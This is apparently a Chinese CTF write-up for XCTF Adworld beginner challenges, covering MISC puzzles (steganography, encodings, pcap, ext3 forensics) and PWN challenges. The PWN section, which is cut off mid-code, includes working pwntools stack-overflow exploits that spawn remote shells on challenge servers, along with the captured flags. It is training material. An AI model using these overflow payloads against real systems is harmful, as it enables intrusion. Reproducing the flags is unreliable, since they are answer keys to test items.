# 攻防世界-wp

## 新手区

### MISC

#### 1-Misc-this_is_flag

**题目描述：**

Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}

**题目思路：**

大多数flag的格式是flag{xxx}，比如flag{th1s_!s_a_d4m0_4la9}

flag{th1s_!s_a_d4m0_4la9}

#### 2-Misc-pdf

**题目来源：**

csaw

**题目描述：**

菜猫给了菜狗一张图，说图下面什么都没有

**题目附件：**

[ad00be3652ac4301a71dedd2708f78b8.pdf)](https://adworld.xctf.org.cn/media/task/attachments/ad00be3652ac4301a71dedd2708f78b8.pdf)

**题目思路：**

题目给出一个pdf文件，并提示：图片下面什么都没有。flag可能会隐藏在图片下面。

1、利用在线工具：[https://app.xunjiepdf.com/pdf2word](https://app.xunjiepdf.com/pdf2word) 将pdf转换为word,从而移开图片

2、用pdf编辑工具

3、利用linux自带工具pdftotext：如果没有的话，可以进行安装

 `root@kali:~/桌面#`apt-get update

 `root@kali:~/桌面#`apt install poppler-utils

【pdftotext 文件名 转换后的文件名】，可得到一个转换后的txt文本，然后利用grep命令搜索flag

4、使用火狐打开，F12得到flags

**解题过程：**
 `root@kali:~/桌面#` pdftotext b560b0bbaa9344a790d54c79e25e07c2.pdf 1.txt
 `root@kali:~/桌面#` cat 1.txt | grep flag
flag{security_through_obscurity}

flag{security_through_obscurity}

#### 3-Misc-gif 

**题目描述：**

 菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机 

**题目附件：**

[dbbc971bf4da461fb8939ed8fc9c4c9d.zip](https://adworld.xctf.org.cn/media/task/attachments/dbbc971bf4da461fb8939ed8fc9c4c9d.zip)

**题目思路：**

下载附件并解压,发现是一堆黑色和白色的图片，首先想到的是摩斯电码，但这个猜想不可行，一是没有分隔符，二是摩斯电码里面并不包含‘{’和‘}’

黑白可能对应二进制的‘0’和‘1’，01100110前八位二进制换算后为 f，图片总数为104，是8的倍数，证明思路正确。二进制转字符串得到 flag。

**解题过程：**

![104张图片](https://img-blog.csdnimg.cn/20190511212537297.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNDgxNTA1,size_16,color_FFFFFF,t_70)

python脚本，白色对应0,黑色对应1,得到

```python
from PIL import Image
result=""
for num,i in enumerate(range(104)):
	img=Image.open(f"{i}.jpg")
	im=img.convert("RGB")
	r,g,b=im.getpixel((1,1))
	if r!=255:
		result+="1"
	else:
		result+="0"
print(result)
#01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101
```

8位二进制数用python脚本转换ascii的字符编码 

```python
x=[0b01100110, 0b01101100, 0b01100001, 0b01100111, 0b01111011, 0b01000110, 0b01110101, 0b01001110, 0b01011111, 0b01100111, 0b01101001, 0b01000110, 0b01111101]
b="";
for a in x:
    b+=chr(a);
print(b)
```

flag{FuN_giF}

#### 4-Misc-如来十三掌 

**题目描述：**

菜狗为了打败菜猫,学了一套如来十三掌。 

 **题目附件：**

 [833e81c19b2b4726986bd6a606d64f3c.docx](https://adworld.xctf.org.cn/media/task/attachments/833e81c19b2b4726986bd6a606d64f3c.docx)

**题目思路：**

真是要念经啊：

>夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮

与佛论禅，把待解密文字输在下面的文本框，前面要加佛曰：，然后参悟佛所言的真意，得到base64码，先进行ROT13然后再base64解码。

**解题过程：**

 [与佛论禅](http://www.keyfc.net/bbs/tools/tudoucode.aspx)

>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9

[rot13解码](http://www.mxcz.net/tools/rot13.aspx)
>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9

[base64解码](http://tool.oschina.net/encrypt?type=3)

flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}

#### 5-Misc-give_you_flag

**题目描述：**

菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包

**题目附件：**

[4b0799f9a4d649f09a882b6b1130bb70.gif](https://adworld.xctf.org.cn/media/task/attachments/4b0799f9a4d649f09a882b6b1130bb70.gif)

**题目思路：**

把动图保存下来,将每帧分开,看到地50帧有个二维码样子的东西，二维码缺少三个小方块，而这些小方块被称为定位图案，用于标记二维码矩形的大小，用三个定位图案可以标识并确定一个二维码矩形的位置和方向。

**解题过程：**

1、小龙人数完钞票会展示二维码，使用stegsolve等工具查看帧数得到二维码。

![](https://img-blog.csdnimg.cn/20190420225546685.png)

2、使用工具ps手动画上定位符便可获得完整二维码，扫描获得flag。

![在这里插入图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL21lZGlhL3VwbG9hZHMvd3JpdGV1cC9lZTVhMzQyNjcxOWYxMWVhODhhN2ZhMTYzZTNjM2ZkMi5wbmc?x-oss-process=image/format,png)

flag{e7d478cf6b915f50ab1277f78502a2c5}

#### 6-Misc-坚持60s

**题目来源：**

08067CTF

**题目描述：**

菜狗发现最近菜猫不爱理他,反而迷上了菜鸡

**题目附件：**

[9dc125bf1b84478cb14813d9bed6470c.jar](https://adworld.xctf.org.cn/media/task/attachments/9dc125bf1b84478cb14813d9bed6470c.jar)

**题目思路：**

一个java做的游戏，既然是程序会给出flag，那么flag就在源代码中了。

**解题过程：**

1.用java反编译工具jd-gui反编译，在`/cn.bjsxt/plane/PlaneGameFrame.class`中或者从`/META-INF/MANIFEST.MF`中点进`Main-Class`主函数就可以找到flag。

![在这里插入图片描述](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL21lZGlhL3VwbG9hZHMvd3JpdGV1cC8yMTQwZDFkMGYzNDAxMWU5OWY1NjAwMTYzZTAwNGU5My5wbmc?x-oss-process=image/format,png)

2.010编辑器打开后发现PK开头，将后缀改成rar，解压后到`/cn/bjsxt/plane`下，用winhex打开`PlaneGameFrame.class`可以直接找到flag

flag里面需要 base64 解码（[https://base64.us](https://base64.us)）

flag{DajiDali_JinwanChiji}

#### 7-Misc-掀桌子 

**题目来源：**

 DDCTF2018

**题目描述：**

菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻

**题目思路：**

解密方法，两个一位，16进制转10进制，然后减去128再转成字符即可 

**解题过程：**

python：
```python
string="c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"
flag = ''
for i in range(0,len(string), 2):
    flag += chr(int("0x" + string[i] + string[i+1], 16) - 128)
print(flag)
#Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr
```
flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr}

#### 8-Misc-ext3

**题目来源：**

bugku

**题目描述：**

今天是菜狗的生日，他收到了一个linux系统光盘

**题目附件：**

[f1fc23f5c743425d9e0073887c846d23](https://adworld.xctf.org.cn/media/task/attachments/f1fc23f5c743425d9e0073887c846d23)

**题目思路：**

下载文件，文件名是Linux，拿到kali中看下文件类型，strings查看一下有没有flag这样的字符串
ext3就是Linux的一个文件系统，把这个文件系统挂载到Linux上：`mount linux /mnt`，挂上去之后看一下/mnt/下的文件，用命令ls -al /mnt/可以看到上面strings查找到的O7avZhikgKgbF目录，flag.txt就在这个目录里，得到文件内容为：`ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=`，[base64解码](https://base64.us)即可

**解题过程：**

`root@kali:~/桌面#` ***file f1fc23f5c743425d9e0073887c846d23***
f1fc23f5c743425d9e0073887c846d23: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)
`root@kali:~/桌面#` ***strings f1fc23f5c743425d9e0073887c846d23 |grep flag***
.flag.txt.swp
flag.txtt.swx
~root/Desktop/file/O7avZhikgKgbF/flag.txt
.flag.txt.swp
flag.txtt.swx
.flag.txt.swp
flag.txtt.swx
`root@kali:~/桌面#` ***mount f1fc23f5c743425d9e0073887c846d23 /mnt***
`root@kali:~/桌面#` ***ls /mnt/ -la |grep O7***
drwxr-xr-x  2 root root  1024  8月  8  2018 O7avZhikgKgbF
`root@kali:/mnt#` ***cd /mnt/O7avZhikgKgbF/***
`root@kali:/mnt/O7avZhikgKgbF#` ***ls*** 
flag.txt
`root@kali:/mnt/O7avZhikgKgbF#` ***cat flag.txt*** 
ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=

flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}

#### 9-Misc-SimpleRAR

**题目来源：**

08067CTF

**题目描述：**

菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)

**题目附件：**

[18c5326aada0499eafbe03ad8a52e40c.rar](https://adworld.xctf.org.cn/media/task/attachments/18c5326aada0499eafbe03ad8a52e40c.rar)

**题目思路：**

rar文件块的开头是 A8 3C 74,于是更改 A8 3C 7A 为 A8 3C 74
解压后得到 secret.png 图片，用 ps 工具分离图层后分别保存
使用图片分析工具 Stegsolve 分别找到两个图层里上半部分和下半部分的二维码，合成一个后补全定位点即可扫描得到 flag

**解题过程：**

用sublime3打开压缩包，修改第6行文件头65a8 3c74（A->4），另存为1.rar

![img](https://img-blog.csdnimg.cn/20190507204114833.png)

解压后得到 secret.png图片，直接用ps无法打开，把后缀改为gif，再使用ps打开,发现两个图层，把隐藏的图层显示出来，然后使用Stegsolve（D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar）打开调整到red plane 0或Gray bits，可以发现上半部分和下半部分的二维码

![img](https://img-blog.csdnimg.cn/20190507203442536.png)

合成一个图片后补全定位点

![img](https://img-blog.csdnimg.cn/20190507203838982.png)

flag{yanji4n_bu_we1shi}

#### 10-Misc-base64stego

**题目来源：**

olympicCTF

**题目描述：**

菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓

**题目附件：**

[a2eb7ceaf5ab49f7acb33de2e7eed74a.zip](https://adworld.xctf.org.cn/media/task/attachments/a2eb7ceaf5ab49f7acb33de2e7eed74a.zip)

**题目思路：**

base64原理：文本->ascii编码->二进制->每6个为一位转换成十进制->通过base64表转换成文本

![Base64 表](https://img-blog.csdnimg.cn/img_convert/e6e011163720b7db05f6e2b73b106ec2.png)

比如,，字符串”Man”经过 Base64 编码后变为”TWFu”

![img](https://img-blog.csdnimg.cn/img_convert/dfe97d1f14c755e8e5d78a4c797f22cb.png)

编码时如果字符串字节数不是3的倍数，则位数就不是6的倍数，就不能划分成6位一组，此时需要在原数据二进制值后添加0，然后在编码后的字符串后加上一个或两个“=”，表示添加的0的个数

解码时先去掉等号，转为二进制数，扔掉多余位转为对应的ASCII码，扔掉多余的0恢复成原字符串.

隐写原理：解码时丢弃的0可以隐藏信息。

**解题过程：**

压缩包需要解压密码，打开010分析前四位是文件头，后四位是压缩解压的pkware版本接下来就是加密标记，如果的两个若不是0000便会提示有密码，这种zip伪加密可以使用winRAR打开，进入工具，修复压缩文件，修复完后压缩包就可以打开了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190105164308391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Ryb3BhbGw=,size_16,color_FFFFFF,t_70)

这里的思路是先循环解密base64字符串，提取出隐写的最后2-4位，再拼接最后转回ascii码flag就出来了

```python
import base64
bin_str=''
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('stego.txt','r') as f:
   for line in f.readlines():
      stegb64="".join(line.split())
      rowb64="".join(str(base64.b64encode(base64.b64decode(stegb64)),'utf-8').split())
      offset=abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=', '')[-1]))
      equalnum=line.count('=')
      if equalnum:
         bin_str += bin(offset)[2:].zfill(equalnum * 2)
   print(''.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0,len(bin_str),8)]))
```

flag{Base_sixty_four_point_five}

#### 11-Misc-stegano

**题目来源：**

CONFidence-DS-CTF-Teaser

**题目描述：**

菜狗收到了图后很开心，玩起了pdf提交格式为flag{xxx}，解密字符需小写

**题目附件：**

[d802bcf9530b45e0b37170c67b8efcea.pdf](https://adworld.xctf.org.cn/media/task/attachments/d802bcf9530b45e0b37170c67b8efcea.pdf)

**题目思路：**

火狐浏览器中打开pdf文件，然后Ctrl+A选中所有文字，在Ctrl+C复制,接着粘贴到一个txt文本中，得到一串AB编码而成的字符串，将A变为 . ，B变为 - ,摩斯解密。

**解题过程：**
![img](https://img-blog.csdnimg.cn/2019041321193087.png)
>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB

Ctrl+H，将A变为 . ，B变为 -
>-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--

摩斯解密
>c o n g r a t u l a t i o n s , f l a g : 1 n v 1 5 1 b l 3 m 3 5 5 4 g 3 

flag{1nv151bl3m3554g3}

#### 12-Misc-功夫再高也怕菜刀

**题目来源：**

安恒杯

**题目描述：**

菜狗决定用菜刀和菜鸡决一死战

**题目附件：**

[acfff53ce3fa4e2bbe8654284dfc18e1.pcapng](https://adworld.xctf.org.cn/media/task/attachments/acfff53ce3fa4e2bbe8654284dfc18e1.pcapng)

**题目思路：**

wireshark中看到flag.txt后，可以运用binwalk  -e分离这个包，在分离出的文件中有一个压缩包，里面有flag.txt，可是有密码，再看这个包中的数据，发现里有个6666.jpg，复制十六进制到010编辑器中保存为.jpg文件后，得到密码后解压得到flag

**解题过程：** 

拿到文件是一个数据流量包，用wireshark打开后，ctrl+f，用分组字节流搜索字符串flag，追踪TCP流，可以看到flag.txt，用kail中的foremost来分解，分解后得到一个需要输入密码的压缩包。

![img](https://img-blog.csdnimg.cn/img_convert/846b8d54bdbe8e1ac6d9c761b555a8b3.png)

wireshirk分析一下，ctrl+f，用分组字节流搜索字符串jpg，发现1150处存在多个文件，右键追踪一下TCP流，尝试去找到这个6666.jpg图片

![img](https://img-blog.csdnimg.cn/img_convert/886ca1be36d0214988913c0e05af6a96.png)

jpg格式是以FFD8FF开头，以FFD9结尾的。所以复制部分内容，打开010编辑器，新建文本文件->编辑->粘贴自十六进制文本，另存为1.jpg

![img](https://img-blog.csdnimg.cn/img_convert/c43fd6fa26de0660a2d9e3c54de8cbf5.png)

打开图片，使用密码Th1s_1s_p4sswd_!!!打开压缩包中的flag

flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}

### PWN

#### 1-Pwn-level0

**题目来源：**

XMan

**题目描述：**

菜鸡了解了什么是溢出，他相信自己能得到shell

**题目场景：**

220.249.52.133:48442

**题目附件：**

[291721f42a044f50a2aead748d539df0](https://adworld.xctf.org.cn/media/task/attachments/291721f42a044f50a2aead748d539df0)

**题目思路：**

直接栈溢出，题目给了参数为/bin/sh的callsystem函数在0x400596

**解题过程：**

载入IDA64，找到main函数F5反编译得到伪C代码，一行打印，一行输入，进入vulnerable_function函数。

```c++
ssize_t vulnerable_function(){
  char buf; // [rsp+0h] [rbp-80h]
  return read(0, &buf, 0x200uLL);
}
```

buf这个字符数组的长度只有0x80，而我们可以输入0x200的东西，能覆盖掉数组外面的东西。当属于数组的空间结束后，有一个0x8个字节长度的s，其次是一个存放着返回地址的r。我们可以输入数据，覆盖到返回地址r。

```shell
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 buf             db ?
......
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010 ; end of stack variables
```

`_system`函数拥有系统的最高权限，参数为`/bin/sh`可以提供终端，从而控制系统。左侧的函数列表找到callsystem，地址是0x400596把他写到返回地址r上，在数组结束后直接返回到callsystem函数上。

```sh
.text:0000000000400596                         ; Attributes: bp-based frame
.text:0000000000400596                                         public callsystem
.text:0000000000400596                         callsystem      proc near
.text:0000000000400596                         ; __unwind {
.text:0000000000400596 55                                      push    rbp
.text:0000000000400597 48 89 E5                                mov     rbp, rsp
.text:000000000040059A BF 84 06 40 00                          mov     edi, offset command ; "/bin/sh"
.text:000000000040059F E8 BC FE FF FF                          call    _system
.text:00000000004005A4 5D                                      pop     rbp
.text:00000000004005A5 C3                                      retn
.text:00000000004005A5                         ; } // starts at 400596
.text:00000000004005A5                         callsystem      endp
```

解释一下汇编：x64和x32的汇编参数存放的位置不同，32位存在栈里，直接压入四个随意字节，再压入`_system`的参数地址，而64位优先存在寄存器里，所以需要把/bin/sh复制到寄存器里，然后再调用`_system`。脚本：

```python
from pwn import *
p = remote("220.249.52.133", 48442)
payload = 'A' * 0x80 + 'a' * 0x8 + p64(0x00400596)
p.recvuntil("Hello, World\n")#当接收数据后
p.sendline(payload)
p.interactive()
```

运行脚本时把中文去掉

```cql
giantbranch@ubuntu:~/Desktop$ python 1.py 
[+] Opening connection to 220.249.52.133 on port 48442: Done
[*] Switching to interactive mode
$ cat flag
cyberpeace{6ec99dbcb629f24001684356904b3c37}
```

cyberpeace{6ec99dbcb629f24001684356904b3c37}

#### 2-Pwn-level2

**题目来源：**

XMan

**题目描述：**

菜鸡请教大神如何获得flag，大神告诉他使用`面向返回的编程`(ROP)就可以了

**题目场景：**  

220.249.52.133:56257

**题目附件：**

[1ab77c073b4f4524b73e086d063f884e](https://adworld.xctf.org.cn/media/task/attachments/1ab77c073b4f4524b73e086d063f884e)

**题目思路：**

构造出0x88长度的buf数据，再输入4个长度的垃圾数据以覆盖ebp，由于是32位程序，所以直接加上call _system的地址以及/bin/sh的地址

**解题过程：**

载入IDA，F5反编译得到伪C代码，发现mian函数中有system，先查看vulnerable_function函数。

```c
ssize_t vulnerable_function(){
  char buf; // [esp+0h] [ebp-88h]
  system("echo Input:");
  return read(0, &buf, 0x100u);}
```

buf这个字符数组的长度只有0x88，却可以输入0x100的东西，能覆盖掉数组外面的东西。当属于数组的空间结束后，有一个4个字节长度的s，其次是一个存放着返回地址的r。我们可以输入数据，覆盖返回地址r。

```sh
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 buf             db ?
......
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

题目给了参数/bin/sh，shift+F12查看字符串位置，找到/bin/sh在0x0804A024。

```sh
.data:0804A024 2F 62 69 6E 2F 73 68 00 hint            db '/bin/sh',0
```

重新回到main函数，发现存在system函数，tab，空格切换IDA视图，确定`_system`地址。
解释一下汇编：x64和x32的汇编参数存放的位置不同，64位优先存在寄存器里，需要把/bin/sh参数复制到寄存器里，然后再调用`_system`，而32位存在栈里，直接压入四个随意字节，再压入`_system`的参数命令地址。

```shell
.text:08048480                         ; __unwind {
.text:08048480 8D 4C 24 04                             lea     ecx, [esp+4]
.text:08048484 83 E4 F0                                and     esp, 0FFFFFFF0h
.text:08048487 FF 71 FC                                push    dword ptr [ecx-4]
.text:0804848A 55                                      push    ebp
.text:0804848B 89 E5                                   mov     ebp, esp
.text:0804848D 51                                      push    ecx
.text:0804848E 83 EC 04                                sub     esp, 4
.text:08048491 E8 B5 FF FF FF                          call    vulnerable_function
.text:08048496 83 EC 0C                                sub     esp, 0Ch
.text:08048499 68 4C 85 04 08                          push    offset aEchoHelloWorld ; "echo 'Hello World!'"
.text:0804849E E8 7D FE FF FF                          call    _system
.text:080484A3 83 C4 10                                add     esp, 10h
.text:080484A6 B8 00 00 00 00                          mov     eax, 0
.text:080484AB 8B 4D FC                                mov     ecx, [ebp+var_4]
.text:080484AE C9                                      leave
.text:080484AF 8D 61 FC                                lea     esp, [ecx-4]
.text:080484B2 C3                                      retn
.text:080484B2                         ; } // starts at 8048480
```

call _system地址是0x0804849E把他写到返回地址r上，在数组结束后直接返回到`_system`函数上，再传入/bin/sh参数地址，脚本：

```python
from pwn import *
p = remote("220.249.52.133",56257)
payload = 'A' * 0x88 + 'a' * 0x4 + p32(0x0804849E)+p32(0x0804A024)#32位程序要用p32
p.recvuntil("")
p.sendline(payload)
p.interactive()
```

cyberpeace{fc8c57d0da48c7b6a6dc7b5c983b5188}

#### 3-Pwn-guess_num

**题目描述：**

菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么

**题目场景：**  

220.249.52.133:35323

**题目附件：**

[b59204f56a0545e8a22f8518e749f19f](https://adworld.xctf.org.cn/media/task/attachments/b59204f56a0545e8a22f8518e749f19f)

**题目思路：**

随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。

**解题过程：**

载入IDA64，找到main函数，F5反编译得到伪C代码，发现输入v8名字时可以覆盖sreed[0]，这样这个随机数列就可控了。

```c++
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  FILE *v3; // rdi
  int v5; // [rsp+4h] [rbp-3Ch]
  int i; // [rsp+8h] [rbp-38h]
  int v7; // [rsp+Ch] [rbp-34h]
  char v8; // [rsp+10h] [rbp-30h]
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
  unsigned __int64 v10; // [rsp+38h] [rbp-8h]
  v10 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v3 = stderr;
  setbuf(stderr, 0LL);
  v5 = 0;
  v7 = 0;
  *(_QWORD *)seed = sub_BB0(v3, 0LL);
  puts("-------------------------------");
  puts("Welcome to a guess number game!");
  puts("-------------------------------");
  puts("Please let me know your name!");
  printf("Your name:");
  gets(&v8);
  srand(seed[0]);
  for ( i = 0; i <= 9; ++i ){
    v7 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v5);
    puts("---------------------------------");
    if ( v5 != v7 ){
      puts("GG!");
      exit(1);
    }
    puts("Success!");
  }
  sub_C3E();
  return 0LL;
}
```

进入v8，var_30在栈中占0x20，也就是十进制的32，可以覆盖到seed。如果使输入的guessnumber，即v5=v7=随机数%6+1，即可运行sub_C3E得到flag

```sh
-0000000000000030 var_30          db ?
    ......
-0000000000000011                 db ? ; undefined
-0000000000000010 seed            dd 2 dup(?)
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。

方法一：使用python标准库中自带的ctypes模块进行python和c的混合编程。
第7行的`lib/x86_64-linux-gnu/libc.so.6`文件相当于windows 的*.dll，属于动态运行库。
第8行的`p32(0x1)`也可以换成`p64(0x1)`，因为p32是转化成4字节，p64是转化成8字节，在参数是数字的情况下是相等的。

```python
from pwn import *
from ctypes import *
io = remote("220.249.52.133","35323")
#io = process('./guess_num')#本地调试
#elf = ELF('./guess_num')#在脚本中通过elf文件查找
#libc = elf.libc
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")#使用ldd查找
payload = "a" * 0x20 + p32(0x1)
io.recvuntil('Your name:')
io.sendline(payload)
libc.srand(0x1)
for i in range(10):
    num = str(libc.rand()%6+1)
    io.recvuntil('number:')
    io.sendline(num)
io.interactive()
'''giantbranch@ubuntu:~/Desktop$ python 1.py 
[+] Opening connection to 220.249.52.133 on port 35323: Done
[*] Switching to interactive mode
---------------------------------
Success!
You are a prophet!
Here is your flag!cyberpeace{607af6232982005da7c903b914da26f7}
[*] Got EOF while reading in interactive'''
```

方法二：本地编写一个python程序，使用0x61616161作为种子来生成随机数列。

```python
from ctypes import *
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0x61616161)
for i in range(10):
    num = libc.rand()%6+1
    print(num)
```

0x61616161是a，所以在输入名字时输入很长的a就可以溢出覆盖随机种子。按照输出的顺序输入数字就可以得到flag

```c++
giantbranch@ubuntu:~/Desktop$ nc 220.249.52.133 35323
-------------------------------
Welcome to a guess number game!
-------------------------------
Please let me know your name!
Your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
......
-------------Turn:10-------------
Please input your guess number:2
---------------------------------
Success!
You are a prophet!
Here is your flag!cyberpeace{607af6232982005da7c903b914da26f7}
*** stack smashing detected ***: ./guess_num terminated
```

cyberpeace{607af6232982005da7c903b914da26f7}

#### 4-Pwn-when_did_you_born

**题目来源：**

CGCTF

**题目描述：**

只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办

**题目场景：**  

111.198.29.45:47091

**题目附件：**

[24ac28ef281b4b6caab44d6d52b17491](https://adworld.xctf.org.cn/media/task/attachments/24ac28ef281b4b6caab44d6d52b17491)

**题目思路：**

这是一道很简单的栈溢出的题，当然首先你得懂函数调用时栈的原理，你还得学会通过pwntools编写简单的Python脚本，还得懂点Linux运行的机制、懂点IDA。
栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现,发生栈溢出的基本前提是:

    程序必须向栈上写入数据。
    写入的数据大小没有被良好地控制。

**解题过程：**

载入IDA64，找到main函数，F5反编译得到伪C代码：

```c
int64 __fastcall main(__int64 a1, char **a2, char **a3){
  __int64 result; // rax
  char name; // [rsp+0h] [rbp-20h]
  unsigned int input_birth; // [rsp+8h] [rbp-18h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("What's Your Birth?");
  __isoc99_scanf("%d", &input_birth);
  while ( getchar() != 10 )
    ;
  if ( input_birth == 1926 ){
    puts("You Cannot Born In 1926!");
    result = 0LL;
  }
  else{
    puts("What's Your Name?");
    gets((__int64)&name);                       // stack overflow here
    printf("You Are Born In %d\n", input_birth);
    if ( input_birth == 1926 ){
      puts("You Shall Have Flag.");
      system("cat flag");
    }
    else{
      puts("You Are Naive.");
      puts("You Speed One Second Here.");
    }
    result = 0LL;
  }
  return result;
}
```

从`system("cat flag");`这一句来看，我们输入的birth要为1926，但是前面的判断又限制birth不能为1926。

查看重命名后的name与input_birth在栈上的距离：

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019082717285142.png)

name与input_birth相差了8个字节，而且input_birth的地址高于name,所以在第一次输入birth时输入非1926的数，然后在输入name时通过覆盖input_birth地址处的内容为1926来使得判断`input_birth == 1926`成立。

(1926)十进制==(0x786)十六进制

exp脚本：

```python
from pwn import *
p = remote('111.198.29.45',47091)
birth = "1111"
name = "a"*8+ p64(0x786)
p.recvuntil("What's Your Birth?")
p.sendline(birth)
p.recvuntil("What's Your Name?")
p.sendline(name)
p.recv()
p.recv()
print(p.recv())
```

cyberpeace{c292e61b0fe8f85f59d7a56785120bc8}

#### 5-Pwn-hello_pwn

**题目来源：**

NUAACTF

**题目描述：**

pwn！，segment fault！菜鸡陷入了深思

**题目场景：**  

111.200.241.244:34217

**题目附件：**

[4f2f44c9471d4dc2b59768779e378282](https://adworld.xctf.org.cn/media/task/attachments/4f2f44c9471d4dc2b59768779e378282)

**题目思路：**

直接栈溢出，使得dword_60106C位置等于1853186401即可运行后面函数得到flag

**解题过程：**

拿到程序后，我们首先`checksec`一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/743bc6dbbeee49c166cd87a55a6776b9.png#pic_center)

发现是64位程序，只开了NX(堆栈不可执行)，跑一下程序看看 

![img](https://img-blog.csdnimg.cn/img_convert/da4560b93772ab88a10198e2b54f1be8.png)

可以看到它是一个输入，放到IDA64里面查看

```c
int64 __fastcall main(__int64 a1, char **a2, char **a3){
  alarm(0x3Cu);
  setbuf(stdout, 0LL);
